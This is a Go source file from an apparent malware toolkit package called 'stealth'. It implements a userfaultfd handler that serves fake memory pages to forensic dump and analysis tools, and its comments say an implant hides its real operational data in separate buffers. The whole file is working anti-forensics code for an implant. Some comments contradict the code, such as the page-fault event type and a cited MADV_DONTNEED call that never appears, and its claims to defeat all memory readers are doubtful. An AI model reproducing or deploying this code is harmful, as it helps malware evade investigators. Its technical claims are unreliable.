package stealth

// userfaultfd Memory Deception — Serve Fake Memory to Forensic Tools
//
// OPSEC rationale: When a forensic tool reads our process memory via
// /proc/[pid]/mem, process_vm_readv(), or ptrace PEEKDATA, the kernel
// delivers page contents from our address space. With userfaultfd, we
// register a handler for page faults on specific memory regions. When
// ANY reader (including forensic tools) triggers a fault on those pages,
// our handler is invoked and can serve FAKE data instead of real contents.
//
// This means:
//   - Memory dump tools (LiME, AVML) that read /proc/pid/mem get fake pages
//   - Volatility/Rekall analysis sees decoy data
//   - ptrace-based memory readers get fake contents
//   - process_vm_readv gets fake contents
//
// The real data lives in separate, non-uffd-protected pages.
//
// Capability: Unprivileged on kernel <5.11, may need CAP_SYS_PTRACE on 5.11+
// (depends on /proc/sys/vm/unprivileged_userfaultfd)
// Kernel requirement: 4.3+ (userfaultfd), 4.11+ (UFFDIO_COPY)

import (
	"fmt"
	"os"
	"runtime"
	"sync"
	"syscall"
	"unsafe"
)

// userfaultfd syscall and ioctl constants.
const (
	sysUserfaultfd = 323 // __NR_userfaultfd (x86_64)

	// ioctl commands for userfaultfd
	uffdioAPI      = 0xc018aa3f // UFFDIO_API
	uffdioRegister = 0xc020aa00 // UFFDIO_REGISTER
	uffdIoCopy     = 0xc028aa03 // UFFDIO_COPY

	// UFFDIO_REGISTER mode
	uffdioRegModeMissing = 1 << 0 // handle missing page faults

	// Page size (x86_64)
	uffdPageSize = 4096
)

// uffdioAPIStruct is the UFFDIO_API ioctl argument.
type uffdioAPIStruct struct {
	api      uint64
	features uint64
	ioctls   uint64
}

// uffdioRegisterStruct is the UFFDIO_REGISTER ioctl argument.
type uffdioRegisterStruct struct {
	rangeStart uint64
	rangeLen   uint64
	mode       uint64
	ioctls     uint64
}

// uffdIoCopyStruct is the UFFDIO_COPY ioctl argument.
type uffdIoCopyStruct struct {
	dst  uint64
	src  uint64
	len  uint64
	mode uint64
	copy int64
}

// UffdDecoy protects a memory region with userfaultfd, serving fake contents
// to anyone who reads the protected pages.
type UffdDecoy struct {
	uffd        int     // userfaultfd file descriptor
	region      uintptr // start of protected region
	regionLen   uintptr // length of protected region
	regionSlice []byte  // GC root for mmap'd region; keeps backing memory alive
	fakeData    []byte  // fake page content to serve
	realData    []byte  // actual data (stored separately)
	done        chan struct{}
	once        sync.Once
}

// NewUffdDecoy creates a userfaultfd-protected memory region of the given size.
// The region is initially unmapped — any access triggers our fault handler
// which serves fakeData (or zeros if fakeData is nil).
// The real data is stored in a separate unprotected allocation.
func NewUffdDecoy(size int, fakeData []byte) (*UffdDecoy, error) {
	// Round size up to page boundary
	size = (size + uffdPageSize - 1) &^ (uffdPageSize - 1)

	// Create userfaultfd
	fd, _, errno := syscall.Syscall(sysUserfaultfd, 0, 0, 0)
	if errno != 0 {
		return nil, fmt.Errorf("userfaultfd: %v", errno)
	}

	// Initialize the API handshake
	api := uffdioAPIStruct{
		api: 0xaa, // UFFD_API
	}
	if err := uffdIoctl(int(fd), uffdioAPI, unsafe.Pointer(&api)); err != nil {
		syscall.Close(int(fd))
		return nil, fmt.Errorf("UFFDIO_API: %v", err)
	}

	// mmap the protected region — MADV_DONTNEED ensures pages are not resident,
	// so the first access triggers a page fault handled by userfaultfd.
	region, err := syscall.Mmap(-1, 0, size,
		syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS)
	if err != nil {
		syscall.Close(int(fd))
		return nil, fmt.Errorf("mmap: %v", err)
	}

	regionAddr := uintptr(unsafe.Pointer(&region[0]))

	// Register the region with userfaultfd
	reg := uffdioRegisterStruct{
		rangeStart: uint64(regionAddr),
		rangeLen:   uint64(size),
		mode:       uffdioRegModeMissing,
	}
	if err := uffdIoctl(int(fd), uffdioRegister, unsafe.Pointer(&reg)); err != nil {
		syscall.Munmap(region)
		syscall.Close(int(fd))
		return nil, fmt.Errorf("UFFDIO_REGISTER: %v", err)
	}

	// Prepare fake data (pad to region size with zeros)
	fake := make([]byte, size)
	if fakeData != nil {
		copy(fake, fakeData)
	}

	decoy := &UffdDecoy{
		uffd:        int(fd),
		region:      regionAddr,
		regionLen:   uintptr(size),
		regionSlice: region,
		fakeData:    fake,
		realData:    make([]byte, size),
		done:        make(chan struct{}),
	}

	// Start fault handler in background
	go decoy.handleFaults()

	return decoy, nil
}

// handleFaults reads page fault events from userfaultfd and responds with fake data.
func (d *UffdDecoy) handleFaults() {
	defer close(d.done)

	// Each fault event is a uffd_msg struct (32 bytes on x86_64).
	// We only care about UFFD_EVENT_PAGEFAULT (type 0).
	buf := make([]byte, 32)

	for {
		n, err := syscall.Read(d.uffd, buf)
		if err != nil || n < 32 {
			return // fd closed or error — exit handler
		}

		// Event type is at offset 0 (uint8). UFFD_EVENT_PAGEFAULT = 0x12
		if buf[0] != 0x12 {
			continue
		}

		// Faulting address is at offset 16 (uint64) in the uffd_msg.
		faultAddr := *(*uint64)(unsafe.Pointer(&buf[16]))

		// Calculate the page-aligned offset into our region
		pageOffset := (uintptr(faultAddr) - d.region) &^ (uffdPageSize - 1)
		if pageOffset >= d.regionLen {
			continue
		}

		// Serve the fake page via UFFDIO_COPY
		d.serveFakePage(faultAddr&^(uffdPageSize-1), pageOffset)
	}
}

// serveFakePage copies a page of fake data to resolve the fault.
func (d *UffdDecoy) serveFakePage(faultPage uint64, offset uintptr) {
	// Source: the corresponding page from our fake data buffer
	src := uintptr(unsafe.Pointer(&d.fakeData[offset]))

	cp := uffdIoCopyStruct{
		dst: faultPage,
		src: uint64(src),
		len: uffdPageSize,
	}

	uffdIoctl(d.uffd, uffdIoCopy, unsafe.Pointer(&cp))
	runtime.KeepAlive(d.fakeData)
}

// WriteReal writes data to the separate real data buffer (not protected by uffd).
// This is where the implant stores actual operational data.
func (d *UffdDecoy) WriteReal(offset int, data []byte) error {
	if offset+len(data) > len(d.realData) {
		return fmt.Errorf("write exceeds region size")
	}
	copy(d.realData[offset:], data)
	return nil
}

// ReadReal reads from the real data buffer.
func (d *UffdDecoy) ReadReal(offset, length int) ([]byte, error) {
	if offset+length > len(d.realData) {
		return nil, fmt.Errorf("read exceeds region size")
	}
	out := make([]byte, length)
	copy(out, d.realData[offset:])
	return out, nil
}

// Close tears down the userfaultfd and unmaps the protected region.
func (d *UffdDecoy) Close() {
	d.once.Do(func() {
		syscall.Close(d.uffd)
		<-d.done // wait for handler goroutine to exit
		if d.regionSlice != nil {
			syscall.Munmap(d.regionSlice)
		}
	})
}

// uffdIoctl performs an ioctl on a userfaultfd file descriptor.
func uffdIoctl(fd int, cmd uintptr, arg unsafe.Pointer) error {
	_, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(fd), cmd, uintptr(arg))
	if errno != 0 {
		return errno
	}
	return nil
}

// UffdAvailable checks if userfaultfd is available on this kernel.
func UffdAvailable() bool {
	fd, _, errno := syscall.Syscall(sysUserfaultfd, 0, 0, 0)
	if errno != 0 {
		// Check if it's just disabled for unprivileged users
		data, err := os.ReadFile("/proc/sys/vm/unprivileged_userfaultfd")
		if err == nil && len(data) > 0 && data[0] == '0' {
			return false // disabled for unprivileged
		}
		return false
	}
	syscall.Close(int(fd))
	return true
}
